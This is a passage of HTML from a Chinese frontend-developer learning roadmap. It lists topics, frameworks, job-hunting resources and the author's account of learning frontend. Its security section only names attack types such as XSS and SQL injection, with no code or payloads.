href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%b1%8f%e5%b9%95%e5%88%86%e8%be%a8%e7%8e%87%e5%85%bc%e5%ae%b9%e6%80%a7">屏幕分辨率兼容性</a></h4><p><a name="nBzBt"></a></p><h4 id="跨平台兼容性"><a href="#跨平台兼容性" class="headerlink" title="跨平台兼容性"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e8%b7%a8%e5%b9%b3%e5%8f%b0%e5%85%bc%e5%ae%b9%e6%80%a7">跨平台兼容性</a></h4><p><a name="GUNpx"></a></p><h3 id="SEO"><a href="#SEO" class="headerlink" title="SEO"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=seo">SEO</a></h3><ul><li>💬 描述：搜索引擎优化，利用搜索引擎的规则提高网站在有关搜索引擎内的自然排名。</li><li>📚 资源：百度搜索资源平台 <a href="https://ziyuan.baidu.com/cooperateresource/index">https://ziyuan.baidu.com/cooperateresource/index</a></li><li>robots.txt</li><li>description</li><li>keywords</li><li>SiteMap</li><li>HTML 标签优化</li><li>站内链接建设</li><li>友情链接<br><a name="YpX9b"></a></li></ul><h3 id="✅-安全"><a href="#✅-安全" class="headerlink" title="✅ 安全"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e5%ae%89%e5%85%a8">✅ 安全</a></h3><ul><li>⭐️ XSS</li><li>CSRF</li><li>反爬虫</li><li>SQL 注入</li><li>DDoS<br><a name="TGrAs"></a></li></ul><h2 id="五、前端生态"><a href="#五、前端生态" class="headerlink" title="五、前端生态"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e4%ba%94%e3%80%81%e5%89%8d%e7%ab%af%e7%94%9f%e6%80%81">五、前端生态</a></h2><ul><li>💬 描述：如今，前端领域的范围越来越广，出现了更多前端工程师需要了解和关注的技术。</li><li>🎯 目标：能用学到的前端技术去做更多的事情，比如开发个人博客、文档网站、小程序、APP 等。<br><a name="qoz0x"></a></li></ul><h3 id="⭐️-静态站点构建"><a href="#⭐️-静态站点构建" class="headerlink" title="⭐️ 静态站点构建"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-%e9%9d%99%e6%80%81%e7%ab%99%e7%82%b9%e6%9e%84%e5%bb%ba">⭐️ 静态站点构建</a></h3><p><a name="AW725"></a></p><h4 id="开发"><a href="#开发" class="headerlink" title="开发"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%bc%80%e5%8f%91">开发</a></h4><ul><li>React Static<br><a name="LNOGU"></a></li></ul><h4 id="博客"><a href="#博客" class="headerlink" title="博客"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%8d%9a%e5%ae%a2">博客</a></h4><ul><li>✅ Gatsby.js</li><li>✅ Docusaurus</li><li>Hugo</li><li>Hexo<br><a name="FwpuP"></a></li></ul><h4 id="文档"><a href="#文档" class="headerlink" title="文档"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%96%87%e6%a1%a3">文档</a></h4><ul><li>JekyII</li><li>⭐️ Docsify</li><li>VuePress</li><li>✅ Dumi<br><a name="nvO9p"></a></li></ul><h3 id="✅-大前端"><a href="#✅-大前端" class="headerlink" title="✅ 大前端"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e5%a4%a7%e5%89%8d%e7%ab%af">✅ 大前端</a></h3><p>💬 描述：前端技术的融合更加紧密，应用的领域也更加广泛，前端领域的内容呈现多样化，除了网站外，还可以用前端技术跨平台开发 Android、iOS、小程序、虚拟现实、增强现实等。<br><a name="cj76b"></a></p><h4 id="移动应用"><a href="#移动应用" class="headerlink" title="移动应用"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e7%a7%bb%e5%8a%a8%e5%ba%94%e7%94%a8">移动应用</a></h4><ul><li>Hybrid</li><li>WebView</li><li>React Native</li><li>Flutter<br><a name="y8Y90"></a></li></ul><h4 id="移动应用打包"><a href="#移动应用打包" class="headerlink" title="移动应用打包"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e7%a7%bb%e5%8a%a8%e5%ba%94%e7%94%a8%e6%89%93%e5%8c%85">移动应用打包</a></h4><ul><li>Weex</li><li>Cordova</li><li>Phonegap</li><li>Ionic<br><a name="h6cxr"></a></li></ul><h4 id="桌面应用"><a href="#桌面应用" class="headerlink" title="桌面应用"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%a1%8c%e9%9d%a2%e5%ba%94%e7%94%a8">桌面应用</a></h4><ul><li>Electron</li><li>NW.js</li><li>Proton Native<br><a name="u1eWy"></a></li></ul><h4 id="小程序"><a href="#小程序" class="headerlink" title="小程序"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%b0%8f%e7%a8%8b%e5%ba%8f">小程序</a></h4><ul><li>原生</li><li>WebView<br><a name="M410S"></a></li></ul><h4 id="跨端开发框架"><a href="#跨端开发框架" class="headerlink" title="跨端开发框架"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e8%b7%a8%e7%ab%af%e5%bc%80%e5%8f%91%e6%a1%86%e6%9e%b6">跨端开发框架</a></h4><ul><li>✅ uni-app</li><li>✅ Taro</li><li>Flutter</li><li>Chameleon</li><li>Wepy</li><li>Rax<br><a name="m1A1U"></a></li></ul><h4 id="移动端调试"><a href="#移动端调试" class="headerlink" title="移动端调试"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e7%a7%bb%e5%8a%a8%e7%ab%af%e8%b0%83%e8%af%95">移动端调试</a></h4><ul><li>Chrome Dev Tools</li><li>Android Simulator</li><li>IOS Simulator<br><a name="YL19M"></a></li></ul><h3 id="✅-Serverless"><a href="#✅-Serverless" class="headerlink" title="✅ Serverless"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-serverless">✅ Serverless</a></h3><ul><li>💬 描述：一种构建和管理基于微服务架构的完整流程，允许你在服务部署级别而不是服务器部署级别来管理你的应用部署，你甚至可以管理某个具体功能或端口的部署，这就能让开发者快速迭代，更快速地开发软件。<br><a name="V6Iow"></a></li></ul><h3 id="✅-云开发"><a href="#✅-云开发" class="headerlink" title="✅ 云开发"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e4%ba%91%e5%bc%80%e5%8f%91">✅ 云开发</a></h3><ul><li>💬 描述：云端一体化的后端云服务 ，采用 Serverless 架构，免去了移动应用构建中繁琐的服务器搭建和运维。同时云开发提供的静态托管、命令行工具（CLI）、Flutter SDK 等能力降低了应用开发的门槛。使用云开发可以构建完整的小程序&#x2F;小游戏、H5、Web、移动 App 等应用。</li><li>✅ 腾讯云云开发</li><li>阿里云云开发<br><a name="ivle5"></a></li></ul><h3 id="低代码"><a href="#低代码" class="headerlink" title="低代码"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e4%bd%8e%e4%bb%a3%e7%a0%81">低代码</a></h3><ul><li>💬 描述：无需编码（零代码）或通过少量代码就可以快速生成应用程序的开发平台。通过可视化进行应用程序开发的方法，使具有不同经验水平的开发人员可以通过图形化的用户界面，使用拖拽组件和模型驱动的逻辑来创建网页和移动应用程序。</li><li>腾讯云低码</li><li>阿里宜搭<br><a name="gkHR9"></a></li></ul><h2 id="六、前端求职"><a href="#六、前端求职" class="headerlink" title="六、前端求职"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%85%ad%e3%80%81%e5%89%8d%e7%ab%af%e6%b1%82%e8%81%8c">六、前端求职</a></h2><ul><li>💬 描述：求职是一个漫长的过程，建议拉长战线，尽早准备。</li><li>🎯 目标：找到理想的工作。<br><a name="sEU2Z"></a></li></ul><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%b5%81%e7%a8%8b">流程</a></h3><ul><li>2020 秋招面经汇总：<a href="https://www.nowcoder.com/discuss/205497">https://www.nowcoder.com/discuss/205497</a><br><a name="VrS3x"></a></li></ul><h3 id="简历"><a href="#简历" class="headerlink" title="简历"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e7%ae%80%e5%8e%86">简历</a></h3><ul><li>超级简历<br><a name="bV8Ek"></a></li></ul><h3 id="面试题库"><a href="#面试题库" class="headerlink" title="面试题库"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e9%9d%a2%e8%af%95%e9%a2%98%e5%ba%93">面试题库</a></h3><ul><li>牛客前端工程师面试宝典：<a href="https://www.nowcoder.com/tutorial/96/f5212664ab664984882b00635066ded2">https://www.nowcoder.com/tutorial/96/f5212664ab664984882b00635066ded2</a></li><li>前端面试每日 3+1：<a href="https://github.com/haizlin/fe-interview">https://github.com/haizlin/fe-interview</a></li><li>React 面试题目 &amp; 题解：<a href="https://github.com/sudheerj/reactjs-interview-questions">https://github.com/sudheerj/reactjs-interview-questions</a><br><a name="Q4vo4"></a></li></ul><h3 id="面经"><a href="#面经" class="headerlink" title="面经"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e9%9d%a2%e7%bb%8f">面经</a></h3><ul><li>前端面经汇总：<a href="https://www.nowcoder.com/discuss/experience?tagId=644">https://www.nowcoder.com/discuss/experience?tagId=644</a><br><a name="vmUbv"></a></li></ul><h3 id="面试实战"><a href="#面试实战" class="headerlink" title="面试实战"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e9%9d%a2%e8%af%95%e5%ae%9e%e6%88%98">面试实战</a></h3><ul><li>AI 模拟面试：<a href="https://www.nowcoder.com/interview/ai/cover?jobTagId=644">https://www.nowcoder.com/interview/ai/cover?jobTagId=644</a><br><a name="MP32T"></a></li></ul><h2 id="七、前端未来"><a href="#七、前端未来" class="headerlink" title="七、前端未来"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e4%b8%83%e3%80%81%e5%89%8d%e7%ab%af%e6%9c%aa%e6%9d%a5">七、前端未来</a></h2><ul><li>💬 描述：前端未来可能的发展趋势和热门技术。</li><li>🎯 目标：关注前沿，持续进步。</li><li>WebAssembly</li><li>智能 UI</li><li>React Server Component</li><li>CSS Houdini<br><a name="Lhinn"></a></li></ul><h3 id="WebComponents"><a href="#WebComponents" class="headerlink" title="WebComponents"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=webcomponents">WebComponents</a></h3><ul><li>HTML templates（HTML 模板）</li><li>Custom elements（自定义元素）</li><li>Shadow DOM（影子 DOM）<br><a name="H6xrA"></a></li></ul><h2 id="我的前端学习路线"><a href="#我的前端学习路线" class="headerlink" title="我的前端学习路线"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%88%91%e7%9a%84%e5%89%8d%e7%ab%af%e5%ad%a6%e4%b9%a0%e8%b7%af%e7%ba%bf">我的前端学习路线</a></h2><p>虽然上面整理的学习路线知识点非常多，但是大家也别太担心，其实按照一定顺序和方法来学习，并不会很难，聊聊我的学习经历。<br><a name="hVwq8"></a></p><h3 id="1-快速入门，培养兴趣"><a href="#1-快速入门，培养兴趣" class="headerlink" title="1. 快速入门，培养兴趣"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=_1-%e5%bf%ab%e9%80%9f%e5%85%a5%e9%97%a8%ef%bc%8c%e5%9f%b9%e5%85%bb%e5%85%b4%e8%b6%a3">1. 快速入门，培养兴趣</a></h3><p>刚开始学习前端时，一定要以培养兴趣、快速入门为目标。我入门前端时，由于没有基础、啥都不懂，因此选择在线实战教程网站来学习，跟着教程案例一行行把代码敲下来，实时浏览显示效果，很轻松地就把 HTML、CSS、JavaScript 的语法基础过了一遍。但是这时，我对看过的知识点没有什么印象，基本是看了就忘，当我想要自己写一个网站，也根本无从下手。<br />于是，我开始试着死记硬背代码，结果发现背了之后还是不会写。那干脆一不做二不休，直接打开编辑器和教程网站，把之前在线实战时敲过的代码复制粘贴到编辑器中，然后再修改保存，到浏览器中打开文件。这样虽然要在编辑器和浏览器中来回切换，但起码能看到自己的网页文件运行的效果了。后来，我利用浏览器开发者工具提升了自己开发网站的调试效率，敲出的代码达不到满意的效果时，就再去查，再改，再浏览，最后终于完成了一个留言板网站！<br />通过这件事，我明白了一个道理，既然记不住知识，那就先别强行记忆，上手多写，忘了就去查不就好了？不要担心自己知识不够做不出来，只要你去试，都一定能实现。<br><a name="xDuBQ"></a></p><h3 id="2-多看多写，巩固基础"><a href="#2-多看多写，巩固基础" class="headerlink" title="2. 多看多写，巩固基础"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=_2-%e5%a4%9a%e7%9c%8b%e5%a4%9a%e5%86%99%ef%bc%8c%e5%b7%a9%e5%9b%ba%e5%9f%ba%e7%a1%80">2. 多看多写，巩固基础</a></h3><p>在这种操作下，我虽然能使用基础三件套开发简易网站了，但做的很慢，还老出问题。于是，我开始完整地看了几本前端入门和项目实战书籍，有三件套入门的，也有响应式网站设计的，还有 JavaScript 综合讲解的，以及一套完整的视频教程，通过这些来复习巩固之前学过的知识，打好了基础，并且了解了更多实战教程上没见到的知识。<br />看书和视频的过程中，我跟着做了几个简易的网站，也是边看边做。在这之后，我发现自己渐渐地能够脱离文档来写网站了！<br><a name="Rbzin"></a></p><h3 id="3-框架学习，学以致用"><a href="#3-框架学习，学以致用" class="headerlink" title="3. 框架学习，学以致用"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=_3-%e6%a1%86%e6%9e%b6%e5%ad%a6%e4%b9%a0%ef%bc%8c%e5%ad%a6%e4%bb%a5%e8%87%b4%e7%94%a8">3. 框架学习，学以致用</a></h3><p>但是，总感觉开发网站时，什么都要自己写，重复的代码写一大堆，很麻烦。于是，我试着上网搜了解决这些问题的方法，发现可以用组件库减少重复编写 HTML 和 CSS 代码，于是学了 LayUI，其实和之前一样的，就是打开官网找到要用的组件，然后复制到项目中修改就行了，写的多了竟然还真记住了一些（虽然这个没必要记）。<br />界面和样式代码简化了，但是 JavaScript 写的我依旧头疼。于是我决定进入下一个阶段的学习，当时先看了本书叫《锋利的 jQuery》来学习 jQuery，学会之后使用它趁热打铁做了几个网站，发现的确能大大简化繁琐的 JavaScript DOM 操作，让我尝到了甜头，又有了继续学习前端的动力。<br />在那之后大概半年，我开始学习主流前端框架 Vue，也是跟着视频教程学，并且结合 ElementUI 组件库开发了一个响应式网站。不得不说，习惯了用原生 JavaScript 和 jQuery 开发后，再去用 Vue 开发，真的是爽飞了，小有成就感。<br><a name="HmsWa"></a></p><h3 id="4-根据需要，自主学习"><a href="#4-根据需要，自主学习" class="headerlink" title="4. 根据需要，自主学习"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=_4-%e6%a0%b9%e6%8d%ae%e9%9c%80%e8%a6%81%ef%bc%8c%e8%87%aa%e4%b8%bb%e5%ad%a6%e4%b9%a0">4. 根据需要，自主学习</a></h3><p>在那之后，我就是通过不断地做项目来积累经验，既然编程知识太多学不完，那我就随需随学，逐渐拓宽自己的知识面。举个例子，我要做一个移动端 H5 页面，那就去搜 Vue 的移动端组件库，学会了 MintUI、VantUI 等；项目中要处理日期，那我就去搜日期处理库，学会了 Moment.js；项目重复文件和代码太多，我就去网上搜一些组件化、模块化的最佳实践；项目代码太大、加载太慢，我就去网上搜一些前端压缩、性能优化的方式；要把开发好的项目变成 APP，那我就去网上搜到了 Cordova 等打包工具；跟其他同学一起做项目时比较混乱、开发效率低，我就去搜了一些代码规范、前端工程化等；遇到 Bug 时，也是自己去网上搜索解决方案，并且还要看看有没有知识点是我遗漏的，我会再去弥补学习。通过不断实践、不断遇到问题和自主解决问题，我始终保持着学习的积极性，学到了越来越多前端的知识，并通过归纳总结来加深印象。<br><a name="R9VDZ"></a></p><h3 id="5-渐入佳境，拓宽视野"><a href="#5-渐入佳境，拓宽视野" class="headerlink" title="5. 渐入佳境，拓宽视野"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=_5-%e6%b8%90%e5%85%a5%e4%bd%b3%e5%a2%83%ef%bc%8c%e6%8b%93%e5%ae%bd%e8%a7%86%e9%87%8e">5. 渐入佳境，拓宽视野</a></h3><p>在那之后，我学前端技术非常快了，像 React、TypeScript、Redux、Dva、Umi、Lerna 等等都随用随学，随学随用。此外，我不仅仅关注前端网页开发本身，还同时关注前端的生态和发展，学习了微前端、Serverless、云开发、低代码等技术，因此个人的能力提升也很大。如今在鹅厂工作中也是，面对各种不同技术栈的前端项目，我都能迎难而上，毕竟不会就学嘛！<br />哦，写的渐入佳境，我都忘了，自己是一名后端工程师，还搁这儿吹牛逼呢（ 所以本路线难免会有不专业的地方，请大家见谅~<br><a name="orG3i"></a></p><h3 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=_6-%e6%80%bb%e7%bb%93">6. 总结</a></h3><p>总结一下，学前端的路线其实就一句话：基础三件套 &#x3D;&gt; 巩固基础 &#x3D;&gt; 学习框架 &#x3D;&gt; 多做项目 &#x3D;&gt; 按需学习 &#x3D;&gt; 拓宽视野。还有一个学任何编程技术都要注意的点，全程多敲代码！多敲代码！多敲代码！<br><a name="erUgs"></a></p><h2 id="尾声-持续学习"><a href="#尾声-持续学习" class="headerlink" title="尾声 - 持续学习"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%b0%be%e5%a3%b0-%e6%8c%81%e7%bb%ad%e5%ad%a6%e4%b9%a0">尾声 - 持续学习</a></h2><p><a name="D6hG5"></a></p><h3 id="优秀前端人的特质"><a href="#优秀前端人的特质" class="headerlink" title="优秀前端人的特质"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e4%bc%98%e7%a7%80%e5%89%8d%e7%ab%af%e4%ba%ba%e7%9a%84%e7%89%b9%e8%b4%a8">优秀前端人的特质</a></h3><ul><li>深厚的功底</li><li>良好的编码习惯</li><li>发现问题的洞察力</li><li>思维灵活，善于思考</li><li>追求技术，紧跟前沿</li><li>有创造力，有行动力</li><li>追求用户体验</li><li>时刻保持好奇</li><li>全栈意识</li><li>解决问题的能力强</li><li>懂得合作和高效沟通</li><li>重视工作，同样重视生活</li><li>责任心和全局观</li><li>个人的进步能带动团队的进步<br><a name="Lio7H"></a></li></ul><h3 id="学习资源"><a href="#学习资源" class="headerlink" title="学习资源"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%ad%a6%e4%b9%a0%e8%b5%84%e6%ba%90">学习资源</a></h3><ul><li>编程导航（包含以下所有资源，强烈推荐 👍）：<a href="https://www.code-nav.cn/">https://www.code-nav.cn</a></li><li>freeCodecamp 在线编程：<a href="https://learn.freecodecamp.one/">https://learn.freecodecamp.one/</a></li><li>阿里云前端实战学习：<a href="https://edu.aliyun.com/roadmap/frontend">https://edu.aliyun.com/roadmap/frontend</a></li><li>W3Cschool 编程入门实战：<a href="https://www.w3cschool.cn/codecamp/">https://www.w3cschool.cn/codecamp/</a></li><li>腾讯云动手实验室：<a href="https://cloud.tencent.com/developer/labs/gallery">https://cloud.tencent.com/developer/labs/gallery</a></li><li>pink 老师前端入门教程：<a href="https://www.bilibili.com/video/BV14J4114768">https://www.bilibili.com/video/BV14J4114768</a></li><li>MDN 前端文档：<a href="https://developer.mozilla.org/zh-CN">https://developer.mozilla.org/zh-CN</a></li><li>Node.js 入门：<a href="https://cnodejs.org/getstart">https://cnodejs.org/getstart</a></li><li>前端清单：<a href="https://cheatsheets.devtool.tech/">https://cheatsheets.devtool.tech/</a></li><li>前端小课：<a href="https://lefex.github.io/">https://lefex.github.io/</a></li><li>被删的前端游乐场：<a href="http://www.godbasin.com/">http://www.godbasin.com/</a></li><li>《ES6 入门教程》：<a href="https://es6.ruanyifeng.com/">https://es6.ruanyifeng.com/</a></li><li>谷歌 Web 开发者：<a href="https://developers.google.com/web">https://developers.google.com/web</a></li><li>JavaScript 明星项目：<a href="https://risingstars.js.org/2020/zh">https://risingstars.js.org/2020/zh</a></li><li>Best of JS：<a href="https://bestofjs.org/">https://bestofjs.org/</a></li><li>Codewars：<a href="https://www.codewars.com/?language=javascript">https://www.codewars.com/?language=javascript</a></li><li>Vue.js examples：<a href="https://vuejsexamples.com/">https://vuejsexamples.com/</a><br><a name="sSDNA"></a></li></ul><h3 id="前端资讯"><a href="#前端资讯" class="headerlink" title="前端资讯"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%89%8d%e7%ab%af%e8%b5%84%e8%ae%af">前端资讯</a></h3><ul><li>掘金资讯：<a href="https://juejin.cn/news">https://juejin.cn/news</a></li><li>InfoQ：<a 